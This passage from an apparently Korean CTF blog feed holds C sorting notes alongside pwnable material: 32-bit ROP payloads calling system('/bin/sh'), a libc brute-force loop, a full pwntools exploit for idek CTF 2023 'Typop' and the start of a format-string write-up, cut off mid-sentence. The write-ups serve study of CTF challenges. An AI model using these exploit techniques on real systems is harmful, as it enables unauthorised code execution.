class="built_in">printf</span>(<span class="string">&quot;\nfind key: %s\n&quot;</span>, binsearch(arr, n, key) ? <span class="string">&quot;Exist&quot;</span> : <span class="string">&quot;None&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>input</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">9 2 6 5 1 7 3 4 8 1</span><br><span class="line">5</span><br></pre></td></tr></table></figure><ul><li>output</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 1 2 3 4 5 6 7 8 9 </span><br><span class="line">find key: Exist</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> binsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Quick sort (C, qsort)</title>
      <link href="/230123-algorithm-qsort/"/>
      <url>/230123-algorithm-qsort/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void qsort (void *base, size_t nel, size_t width, int (*compare)(const void *, const void *);</span><br></pre></td></tr></table></figure><ul><li><code>stdlib.h</code></li><li><code>O(nlogn)</code> (최악: <code>O(n^2)</code>)</li></ul><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a, <span class="type">const</span> <span class="type">void</span>* b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span>*)a &gt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (*(<span class="type">int</span>*)a &lt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    qsort(arr, n, <span class="keyword">sizeof</span>(<span class="type">int</span>), compare);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[j]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>input</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">9 2 6 5 1 7 3 4 8 1</span><br></pre></td></tr></table></figure><ul><li>output</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 1 2 3 4 5 6 7 8 9</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> qsort </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - 32bit ROP</title>
      <link href="/230119-pwn-32bitrop/"/>
      <url>/230119-pwn-32bitrop/</url>
      
        <content type="html"><![CDATA[<ul><li>x86 calling convention<ul><li>The caller places all arguments to the callee on the <code>stack</code></li><li>Arguments are pushed to the <code>stack</code></li><li>Stack cleanup is performed by the calle<br></li></ul></li><li>rip control</li><li><code>/bin/sh\x00</code> address</li><li>leak the libc address. (e.g <code>got</code>)</li><li>got overwriting</li><li>argument control? -&gt; <code>pop [reg] ; ret</code> gadget address (Role is to add <code>esp</code>)</li></ul><h2 id="Libc-Leak"><a href="#Libc-Leak" class="headerlink" title="Libc Leak"></a>Libc Leak</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x88</span>+<span class="number">0x4</span>) <span class="comment"># (dummy + ebp)</span></span><br><span class="line"></span><br><span class="line">payload += p32(e.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(e.got[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># ret2main</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">leak = struct.unpack(<span class="string">&#x27;I&#x27;</span>, p.recv(<span class="number">4</span>))[<span class="number">0</span>] </span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br></pre></td></tr></table></figure><h2 id="Execute-system-39-bin-sh-x00-39"><a href="#Execute-system-39-bin-sh-x00-39" class="headerlink" title="Execute system(&#39;/bin/sh\x00&#39;)"></a>Execute <code>system(&#39;/bin/sh\x00&#39;)</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># restart main</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x88</span>+<span class="number">0x4</span>) <span class="comment"># (dummy + ebp)</span></span><br><span class="line"></span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>, payload)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 32bit </tag>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - local libc test</title>
      <link href="/230119-pwn-libc/"/>
      <url>/230119-pwn-libc/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> libc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - libc brute forcing in local (p.libcs())</title>
      <link href="/230119-pwn-libc_brute_forcing_in_local/"/>
      <url>/230119-pwn-libc_brute_forcing_in_local/</url>
      
        <content type="html"><![CDATA[<ul><li>로컬에서 원하는 립시 주소 실행할 때까지 특정 바이트 브루트 포싱하기<ul><li><code>p.libcs()</code> 이용</li></ul></li><li>상황<ul><li>8바이트 중 상위 5바이트는 알고 있고, 하위 1.5바이트는 오프셋으로 알고 있는 상황. 하지만 중간 1.5바이트를 모르기 때문에 해당 부분 브루트 포싱이 필요함 -&gt; <code>0x7fb877 ??? b01</code></li></ul></li><li>장점<ul><li>정답인 주소만을 이용하여 페이로드를 전송하기 때문에 디버깅 시 유리함 (빠름)</li></ul></li></ul><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">repr</span>(p.libs())) <span class="comment"># print base</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(p.libs()[<span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/libc.so.6&#x27;</span>] + <span class="number">0xe3b01</span>))</span><br><span class="line"></span><br><span class="line">        aslr = <span class="built_in">hex</span>(p.libs()[<span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/libc.so.6&#x27;</span>] + <span class="number">0xe3b01</span>)[-<span class="number">6</span>:-<span class="number">3</span>] <span class="comment"># 0x7fb877 210 b01 -&gt; only get &#x27;210&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> aslr != <span class="string">&#x27;fff&#x27;</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># exploit code here !!</span></span><br><span class="line">        <span class="comment"># break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><ul><li>출력 결과</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/vuln&#x27;</span>: 4190208, <span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/libc.so.6&#x27;</span>: 140430248431616, <span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/ld-2.31.so&#x27;</span>: 140430250479616&#125;</span><br><span class="line">0x7fb877210b01</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> libc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idek CTF 2023 - Typop (intend, CSU)</title>
      <link href="/230118-idekctf2023-typop2/"/>
      <url>/230118-idekctf2023-typop2/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1839">https://ctftime.org/event/1839</a></li></ul><p>얼마 전에 올렸던 idek CTF에서의 Typop 문제를 언인텐으로 풀이했다는 것을 확인했다. ctftime 구경하다가 이 문제의 다른 풀이를 확인하면서 알게되었다. 당시엔 길이 제한 때문에 <code>csu gadget</code>을 사용 못한다고 생각했다. 하지만 쓸데 없는 페이로드가 있었고 이것만 없으면 길이가 딱 맞아서 <code>csu gadget</code>을 사용하여 <code>win</code> 함수를 실행할 수 있다.</p><p>이 문제에 대한 정보와 분석은 며칠 전 작성한 게시글을 확인하자.</p><ul><li><a href="https://jiravvit.github.io/230116-idekctf2023-typop/">https://jiravvit.github.io/230116-idekctf2023-typop/</a></li></ul><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="csu-int-csu-call"><a href="#csu-int-csu-call" class="headerlink" title="csu_int, csu_call"></a>csu_int, csu_call</h3><img src="/images/230118-idekctf2023-typop2/Screenshot 2023-01-18 at 17.17.11.png" width=700/><br><p>위 사진의 가젯을 사용하여 만든 함수는 아래와 같다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">chain</span>(<span class="params">rdi, rsi, rdx, buf, csu_call</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#payload += b&#x27;A&#x27; * 8        # add rsp, 8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># pop rbx (dummy)</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># pop rbp (dummy)</span></span><br><span class="line">    payload += p64(rdi)         <span class="comment"># pop r12 -&gt; rdi</span></span><br><span class="line">    payload += p64(rsi)         <span class="comment"># pop r13 -&gt; rsi</span></span><br><span class="line">    payload += p64(rdx)         <span class="comment"># pop r14 -&gt; rdx    </span></span><br><span class="line">    payload += p64(buf)         <span class="comment"># pop r15 -&gt; call [buf]</span></span><br><span class="line">    payload += p64(csu_call)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>코드에 주석으로 표현되어 있는 부분이 바로 쓸데없는 페이로드이다. 이 문제에서 저 코드는 필요 없다.</p><p>한편, <code>csu gadget</code>을 사용하기 위해 가장 중요한 것은 call할 주소가 필요하다는 것이다. 사진의 코드에선 <code> call [r15+rbx*8]</code>가 여기에 해당한다. <code>rbx</code>를 0으로 세팅할 것이기 때문에 결국 <code>r15</code>에 저장된 주소가 호출된다. 우리가 실행하고 싶은 주소는 <code>win</code> 함수 주소이기 때문에 어딘가에다가 <code>win</code> 함수 주소를 적어놓고 그 주소를 <code>r15</code>에 넣어줘야 한다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(win)             <span class="comment"># stack addr</span></span><br><span class="line"></span><br><span class="line">payload += p64(csu_init)</span><br><span class="line">payload += chain(<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), stack-<span class="number">0x10</span>, csu_call)</span><br></pre></td></tr></table></figure><p><code>canary</code> 뒤에 <code>win</code> 함수 주소를 넣어줬다. 사전에 stack 주소를 구해놨으니 <code>win</code>함수가 저장되어 있는 stack 주소를 구할 수 있다. 페이로드 글자 수도 문제에서 제한 걸었던 <code>0x5a</code>와 동일하다.</p><h2 id="Solve-Code"><a href="#Solve-Code" class="headerlink" title="Solve Code"></a>Solve Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;typop.chal.idek.team&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chain</span>(<span class="params">rdi, rsi, rdx, buf, csu_call</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#payload += b&#x27;A&#x27; * 8        # add rsp, 8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># pop rbx (dummy)</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># pop rbp (dummy)</span></span><br><span class="line">    payload += p64(rdi)         <span class="comment"># pop r12 -&gt; rdi</span></span><br><span class="line">    payload += p64(rsi)         <span class="comment"># pop r13 -&gt; rsi</span></span><br><span class="line">    payload += p64(rdx)         <span class="comment"># pop r14 -&gt; rdx    </span></span><br><span class="line">    payload += p64(buf)         <span class="comment"># pop r15 -&gt; call [buf]</span></span><br><span class="line">    payload += p64(csu_call)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================================================</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">10</span> + <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (1) canary, stack leak</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span> + p.recv(<span class="number">7</span>))</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;canary: &#x27;</span>+ <span class="built_in">hex</span>(canary))</span><br><span class="line">info(<span class="string">&#x27;stack: &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">10</span> + p64(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================================================</span></span><br><span class="line"><span class="comment"># (2) pie base leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">10</span> + <span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;C&#x27;</span>*<span class="number">7</span> + <span class="string">b&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">pie_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1447</span> </span><br><span class="line">info(<span class="string">&#x27;pie base: &#x27;</span> + <span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (3) for csu_gadget</span></span><br><span class="line">win = pie_base + e.sym[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line">csu_init = pie_base + <span class="number">0x14ca</span></span><br><span class="line">csu_call = pie_base + <span class="number">0x14b0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (3)</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(win)             <span class="comment"># stack addr</span></span><br><span class="line"></span><br><span class="line">payload += p64(csu_init)</span><br><span class="line">payload += chain(<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), stack-<span class="number">0x10</span>, csu_call)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idek&#123;2_guess_typos_do_matter&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idek CTF 2023 - Sprinter (*FSB*)</title>
      <link href="/230117-idekctf2023-sprinter/"/>
      <url>/230117-idekctf2023-sprinter/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1839">https://ctftime.org/event/1839</a></li></ul><blockquote><p>I’ve always found myself to be more of a distance runner than a sprinter, but sometimes you just have to sprint that final stretch.<br><code>nc sprinter.chal.idek.team 1337</code></p></blockquote><ul><li>[25 solves &#x2F; 489 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Canary                        : ✓ (value: 0xfe2ac7e4ac5ec700)</span><br><span class="line">NX                            : ✓ </span><br><span class="line">PIE                           : ✘ </span><br><span class="line">Fortify                       : ✘ </span><br><span class="line">RelRO                         : Partial</span><br></pre></td></tr></table></figure><p><code>canary</code>가 존재한다. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your string into my buffer, located at %p: &quot;</span>, buf);</span><br><span class="line">  fgets(buf, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v0 = (<span class="type">size_t</span>)<span class="built_in">strchr</span>(buf, <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt;= <span class="number">0x26</span> )</span><br><span class="line">      LODWORD(v0) = <span class="built_in">sprintf</span>(buf, buf); <span class="comment">// [*]</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>[*]</code> 에서 <code>Format String Bug</code>가 터진다. 안타깝게도 <code>n</code>을 필터링하고, <code>sprintf(buf, buf)</code> 형식으로 버그가 발생하기 때문에 문제 풀기 굉장히 까다롭다. 페이로드를 적어놨는데 포맷스트링을 실행(?)하면서 내가 적어놨던 페이로드가 덮힐 수도 있기 때문이다. </p><p>문제를 보며 가장 먼저 생각이 들었던 것은 <code>n</code>이 필터링 되어 있는데 어떻게 overflow를 일으켜서 어떻게 ret를 변조하느냐였다. 더욱이 canary가 존재했기 때문에 이것을 어떻게 우회하거나 leak할 지도 고민이었다. 하지만 여러가지 테스트를 진행한 결과 <code>%c</code> 등을 이용해서 overflow를 쉽게 일으킬 수 있었고 canary를 미리 구해놓는 과정이 필요하다고 판단했다.</p><p>이 문제가 까다로운 점이 한 가지 더 존재한다. 바로 페이로드의 길이 제한인데, <code>strlen</code>을 이용해서 페이로드의 길이를 구하고 있다. </p><p>이 문제의 환경은 <code>Ubuntu 20.04</code>이며 다행히 작동하는 <code>one gadget</code>이 존재한다. (문제 파일에 libc가 함께 포함되어 있다.)</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ul><li><a href="https://uz56764.tistory.com/83">https://uz56764.tistory.com/83</a></li></ul><p>기간 내에 이 문제를 풀지 못했기 때문에 위 블로그를 참고하여 공부를 진행했다.</p><h3 id="0-c"><a href="#0-c" class="headerlink" title="0. $[]%[]c"></a>0. <code>$[]%[]c</code></h3><p>뻘하게 헷갈렸던 개념이다.. 정확히는 <code>$[offset]%[num]c</code>으로 정의하고 싶다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%100c\n&quot;</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>이것의 출력 결과는 무엇일까? 99번 공백을 출력하고 마지막에 ‘A’를 출력한다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%100s\n&quot;</span>, <span class="string">&quot;AA&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>자매품으로 이것의 출력 결과는 98번 공백을 출력하고 마지막에 ‘AA’를 출력한다.</p><p><code>$[offset]</code>의 의미는.. <code>FSB</code>에서 많이 보던 바로 그거다. offset 번째를 참조한다. 만약 <code>%10$264c</code>라면 먼저 공백 264개를 출력하고 10번째 offset을 참조한 값을 출력할 것이다.</p><h3 id="1-Canary-보존"><a href="#1-Canary-보존" class="headerlink" title="1. Canary 보존"></a>1. Canary 보존</h3><p>제일 먼저 해야할 일은 <code>canary</code>를 보존해야하는 것이다. (어떻게 보면 이 문제의 핵심이라고도 할 수 있겠다.) 그 전에 